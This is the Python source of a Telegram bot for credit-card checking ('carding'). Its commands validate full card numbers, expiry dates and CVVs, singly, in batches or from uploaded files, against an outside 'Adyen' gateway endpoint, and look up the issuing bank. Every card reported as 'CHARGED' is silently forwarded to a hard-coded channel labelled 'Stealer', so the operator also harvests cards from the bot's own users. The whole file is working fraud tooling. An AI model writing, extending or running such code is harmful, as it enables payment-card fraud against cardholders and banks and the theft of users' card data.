import httpx
import time
import asyncio
import re
import os
from pyrogram import Client, filters
from pyrogram.types import Message
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

# Updated Stealer Channel ID
STEALER_CHANNEL_ID = -1003627495953

# Global to track active file processes to prevent overlaps
ACTIVE_MTXT_PROCESSES = {}

async def send_hit_if_approved(client: Client, text: str):
    try:
        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=text)
    except Exception as e:
        print(f"[Stealer Error] Failed to forward: {e}")

async def check_adyen_card(fullcc):
    """Helper function to check a single card against the Adyen API"""
    endpoint_url = f"https://onyxenvbot.up.railway.app/adyen/key=yashikaaa/cc={fullcc}"
    async with httpx.AsyncClient(timeout=45, follow_redirects=True) as session:
        for attempt in range(2):
            try:
                response_obj = await session.get(endpoint_url)
                result_json = response_obj.json()
                api_status = result_json.get("status", "Unknown").lower()
                response = result_json.get("response", "No response message")
                
                if "approved" in api_status or "charged" in api_status:
                    return "<b>CHARGED 🔥</b>", response
                else:
                    return "<b>DECLINED ❌</b>", response
            except:
                if attempt == 1:
                    return "Error", "Request failed"
                await asyncio.sleep(1)
    return "Error", "Request failed"

def extract_all_cards(text):
    """Extracts cards in format cc|mm|yy|cvv or similar from text"""
    if not text: return []
    return re.findall(r"(\d{15,16})[\s|:|/]+(\d{1,2})[\s|:|/]+(\d{2,4})[\s|:|/]+(\d{3,4})", text)

@Client.on_message(filters.command("ad", [".", "/"]))
async def adyen_cmd(client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(client, message)

        gateway = "Adyen Auth 💳"

        if checkall[0] == False:
            return

        role = checkall[1]
        getcc = await getmessage(message)
        
        if getcc == False:
            resp = f"〈<a href='tg://user?id={user_id}'>{first_name}</a>〉-» Adyen Auth - CHECK\n\n〈♻️〉Gateway -» {gateway} \n\n<a href='tg://user?id={user_id}'>╰┈➤</a> Format -» /ad cc|month|year|cvc"
            await message.reply_text(resp, quote=True)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        
        loading_msg = await message.reply("🍳", quote=True)
        start = time.perf_counter()
        
        task = asyncio.create_task(check_adyen_card(fullcc))
        await asyncio.sleep(2)
        status, response = await task

        getbin = await get_bin_details(cc)
        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]
        
        end = time.perf_counter()
        elapsed_time = round(end - start, 2)

        finalresp = f"[〄] CC        ⟶ <code>{fullcc}</code>\n[〄] STATUS    ⟶ {status}\n[〄] RESULT    ⟶ {response}\n━━━〔 INFO 〕━━━\n[〄] BIN ⟶ {brand} | {type_} - {level}\n[〄] BANK ⟶ {bank}\n[〄] COUNTRY⟶ {country} {flag}\n━━━〔 META 〕━━━\n[〄] GATEWAY ⟶ {gateway}\n[〄] TIME ⟶  {elapsed_time:0.2f}s\n[〄] CHECKED BY TIME ⟶<a href='tg://user?id={user_id}'>{first_name}</a> [{role}] \n━━━〔 OWNER 〕━━━\n<a href=\"tg://user?id=8340881349\">╏╠══[𝍖𝍖𝍖 SPIDER 𝍖𝍖𝍖]      🕷️</a>"

        try:
            await loading_msg.delete()
        except:
            pass
            
        await message.reply_text(finalresp, quote=True)

        await setantispamtime(user_id)
        await deductcredit(user_id)

        if "CHARGED" in status:
            await send_hit_if_approved(client, finalresp)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())

@Client.on_message(filters.command("mad", [".", "/"]))
async def mass_adyen_cmd(client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        
        checkall = await check_all_thing(client, message)
        if checkall[0] == False:
            return
        role = checkall[1]

        input_text = ""
        if message.reply_to_message:
            input_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        elif len(message.command) > 1:
            input_text = message.text.split(None, 1)[1]
            
        cards = extract_all_cards(input_text)
        
        if not cards:
            resp = f"〈<a href='tg://user?id={user_id}'>{first_name}</a>〉-» Adyen Mass - CHECK\n\n〈♻️〉Gateway -» Adyen Auth 💳\n\n<a href='tg://user?id={user_id}'>╰┈➤</a> Format -» /mad cc|month|year|cvc (Max 10)"
            await message.reply_text(resp, quote=True)
            return

        cards = cards[:10]
        total_cards = len(cards)
        
        sent_msg = await message.reply(f"<code>Something Big Cooking 🍳 {total_cards} Total.</code>", quote=True)
        start = time.perf_counter()
        
        for card_data in cards:
            cc, mes, ano, cvv = card_data
            if len(ano) == 4: ano = ano[2:]
            fullcc = f"{cc}|{mes}|{ano}|{cvv}"
            
            status, response = await check_adyen_card(fullcc)
            getbin = await get_bin_details(cc)
            brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]
            
            card_msg = f"{status}\n\nCC ⇾ <code>{fullcc}</code>\nGateway ⇾ Adyen Auth 💳\nResponse ⇾ {response}\n\n<code>BIN Info: {brand} - {type_} - {level}\nBank: {bank}\nCountry: {country} {flag}</code>\n\nTIME ⟶ {time.perf_counter() - start:0.2f}s"
            
            await message.reply_text(card_msg, quote=True)
            
            if "CHARGED" in status:
                hit_msg = f"[〄] CC        ⟶ <code>{fullcc}</code>\n[〄] STATUS    ⟶ {status}\n[〄] RESULT    ⟶ {response}\n━━━〔 INFO 〕━━━\n[〄] BIN ⟶ {brand} | {type_} - {level}\n[〄] BANK ⟶ {bank}\n[〄] COUNTRY⟶ {country} {flag}\n━━━〔 META 〕━━━\n[〄] GATEWAY ⟶ Adyen Auth 💳\n[〄] CHECKED BY ⟶ <a href='tg://user?id={user_id}'>{first_name}</a>\n━━━〔 OWNER 〕━━━\n<a href=\"tg://user?id=8340881349\">╏╠══[𝍖𝍖𝍖 SPIDER 𝍖𝍖𝍖]      🕷️</a>"
                await send_hit_if_approved(client, hit_msg)
            
            await asyncio.sleep(0.5)

        await sent_msg.edit(f"<code>✅ Mass Check Complete! Processed {total_cards} cards.</code>")
        await setantispamtime(user_id)
        await deductcredit(user_id)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())

@Client.on_message(filters.command("mtxt", [".", "/"]))
async def mtxt_cmd(client, message):
    user_id = message.from_user.id
    try:
        checkall = await check_all_thing(client, message)
        if checkall[0] == False: return
        
        if user_id in ACTIVE_MTXT_PROCESSES:
            return await message.reply("<code>Your CC is already Cooking 🍳 wait for complete</code>")

        if not message.reply_to_message or not message.reply_to_message.document:
            return await message.reply("<code>Please reply to a document message with /mtxt</code>")

        file_path = await message.reply_to_message.download()
        try:
            with open(file_path, "r") as f:
                content = f.read()
            os.remove(file_path)
        except Exception as e:
            if os.path.exists(file_path): os.remove(file_path)
            return await message.reply(f"❌ Error reading file: {e}")

        cards = extract_all_cards(content)
        if not cards:
            return await message.reply("Any Valid CC not Found 🥲")

        # Limit to 20 for file checks
        limit = 20
        total_found = len(cards)
        if total_found > limit:
            cards = cards[:limit]
            await message.reply(f"<code>📝 Found {total_found} CCs\n⚠️ Processing only first {limit}</code>")
        else:
            await message.reply(f"<code>📝 Found {total_found} valid CCs\n🔥 All will be checked</code>")

        ACTIVE_MTXT_PROCESSES[user_id] = True
        asyncio.create_task(process_mtxt_cards(client, message, cards))

    except Exception:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
        import traceback
        await error_log(traceback.format_exc())

async def process_mtxt_cards(client, message, cards):
    user_id = message.from_user.id
    first_name = message.from_user.first_name
    total = len(cards)
    checked, charged, declined = 0, 0, 0
    
    status_msg = await message.reply("<code>Something Big Cooking 🍳</code>")
    start_time = time.perf_counter()

    try:
        for card_data in cards:
            if user_id not in ACTIVE_MTXT_PROCESSES: break
            
            cc, mes, ano, cvv = card_data
            if len(ano) == 4: ano = ano[2:]
            fullcc = f"{cc}|{mes}|{ano}|{cvv}"
            
            status, response = await check_adyen_card(fullcc)
            checked += 1
            
            if "CHARGED" in status: charged += 1
            else: declined += 1
            
            getbin = await get_bin_details(cc)
            brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]
            
            card_msg = f"{status}\n\nCC ⇾ <code>{fullcc}</code>\nGateway ⇾ Adyen Auth 💳\n\n<code>BIN Info: {brand} - {type_} - {level}\nBank: {bank}\nCountry: {country} {flag}</code>"
            
            res_msg = await message.reply_text(card_msg, quote=True)
            
            if "CHARGED" in status:
                hit_msg = f"[〄] CC        ⟶ <code>{fullcc}</code>\n[〄] STATUS    ⟶ {status}\n[〄] RESULT    ⟶ {response}\n━━━〔 INFO 〕━━━\n[〄] BIN ⟶ {brand} | {type_} - {level}\n[〄] BANK ⟶ {bank}\n[〄] COUNTRY⟶ {country} {flag}\n━━━〔 META 〕━━━\n[〄] GATEWAY ⟶ Adyen Auth 💳\n[〄] CHECKED BY ⟶ <a href='tg://user?id={user_id}'>{first_name}</a>\n━━━〔 OWNER 〕━━━\n<a href=\"tg://user?id=8340881349\">╏╠══[𝍖𝍖𝍖 SPIDER 𝍖𝍖𝍖]      🕷️</a>"
                await send_hit_if_approved(client, hit_msg)
            
            await asyncio.sleep(0.5)

        final_caption = f"""✅ <b>Mass Check Complete!</b>
<b>Total CHARGE 💎 :</b> {charged}
<b>Total Decline ❌ :</b> {declined}
<b>Total Checked ☠️ :</b> {checked}/{total}
<b>Time Taken ⏱️ :</b> {time.perf_counter() - start_time:0.2f}s
"""
        await status_msg.edit(final_caption)
        await setantispamtime(user_id)
        await deductcredit(user_id)

    finally:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
